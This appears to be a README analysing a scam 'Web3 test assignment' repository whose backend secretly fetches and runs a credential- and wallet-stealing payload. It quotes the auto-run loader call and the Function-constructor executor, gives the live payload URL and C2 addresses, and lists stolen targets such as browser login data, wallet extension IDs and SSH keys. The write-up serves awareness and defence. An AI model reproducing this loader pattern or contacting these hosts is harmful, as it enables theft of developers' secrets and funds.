# 📛 README — WARNING: This Repository Contains Malicious Code (For Educational Analysis Only)

## ⚠️ Overview

This repository demonstrates a real-world scam pattern used in fake “Web3 test assignments.”
Inside the backend code, attackers embedded a **remote code execution (RCE) backdoor** that silently downloads and executes JavaScript payloads designed **to steal crypto wallets and browser data**.

This project **must never be executed** on any device connected to the internet or containing personal data.

The goal of this repository is **education and awareness** — to help other developers recognize scam assignments before running them.

## 🚨 How the Malware Works

The malicious behavior is primarily located in:

```
backend/middlewares/helpers/price.js
backend/middlewares/helpers/errorHandler.js
backend/config/env.js
```

The infection chain is triggered automatically **as soon as the backend is imported or started**.
Let’s break down how the attack works.


## 🧨 1. The Backdoor Triggers Automatically at Startup

Inside ```price.js```, the attacker calls:

```initPriceConfig();```

This function runs **immediately on module load**, without any API call or user action.
That alone makes it dangerous — the malicious code activates the moment the backend server starts.
This is executed when ```paymentController.js``` imports the helper:

```
const checkObjectId = require("../middlewares/helpers/price");
```

So simply starting the server is enough to infect your machine.


## 🌐 2. The Code Downloads a Remote Payload (Obfuscated JavaScript)

```initPriceConfig()``` loads three Base64-encoded values from env.js, decodes them, and fetches a JavaScript payload from:
```
https://api.mocki.io/v2/y0p8kvoe/tracks/errors/617333
```

with header:
```
x-secret-header: secret
```

The response looks like:
```
{
  "cookie": "<obfuscated JavaScript payload>"
}
```

This payload is then passed to the malicious executor.


## 🧩 3. The Payload Is Executed via Remote Code Execution (RCE)

```errorHandler.js``` contains:
```
const handler = new (Function.constructor)("require", errCode);
handlerFunc(require);
```

This is equivalent to:
```
eval(payload)
```

but even more dangerous, because it exposes Node.js’s require:

- access to filesystem
- access to network
- access to environment variables
- access to running processes

This gives an attacker full control over your machine.


## 🕵️ 4. What Information the Malware Collects

After deobfuscation, the payload clearly behaves like a crypto wallet & browser credential stealer.

It attempts to collect:

**🗂 Browser data**

- From Chrome / Brave / Opera / Edge:
- Login Data (saved passwords databases)
- .ldb LevelDB session files
- SQLite cookie stores
- Autofill data
- Active session tokens (including exchange sessions)
- Any browser with saved passwords is vulnerable.

**🪙 Crypto wallet data**

The script enumerates directories of dozens of crypto extensions, including:

- MetaMask (ID: nkbihfbeogaeaoehlefnkodbefgpgknn)
- Phantom
- Keplr
- TronLink
- Binance Wallet
- Coinbase Wallet
- Exodus (desktop data files)
- Solana keypairs (solana/id.json)
- Generic .wallet and keystore files

Meaning:
If you ever had a hot wallet installed on the compromised machine → its private keys may have been stolen.

**🔑 Developer secrets**

Depending on file system layout, the payload can also locate:

- .env files with API keys
- SSH private keys (~/.ssh/id_rsa)
- Cloud credentials (AWS, GCP)
- Database connection strings

Since the payload is remote and replaceable, new versions can steal additional data at any time.

## 📤 5. Where the Stolen Data Is Sent

The malware sends collected data to an attacker-controlled C2 server.

Observed exfiltration endpoints include:
```
http://23.227.202.51:1224
```

and, based on external analysis of similar payloads:
```
217.28.223.115
```

The destination host may change at any time because the payload is fetched dynamically from a third-party API endpoint.

Once uploaded, the attacker gains:
- your wallet seed phrases
- your private keys
- your exchange logins
- your browser sessions
- your developer credentials

## Malware code you can find in scam_core.json
